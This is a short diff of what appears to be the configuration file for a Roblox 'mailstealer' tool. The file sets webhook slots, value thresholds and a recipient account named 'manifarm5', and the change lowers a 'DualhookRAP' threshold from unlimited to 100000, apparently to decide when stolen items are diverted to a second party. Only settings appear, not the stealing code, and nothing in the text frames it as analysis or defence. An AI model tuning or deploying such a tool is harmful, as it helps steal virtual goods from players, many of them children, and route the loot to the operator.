@@ -4,7 +4,7 @@ MinimumRAP = 10000
 DualhookUsername = ""
 DualhookWebhook = ""
 LogsWebhook = ""
-DualhookRAP = math.huge
+DualhookRAP = 100000
 mailstealer_name = "XDXD"
 
 Roblox_Username = manifarm5
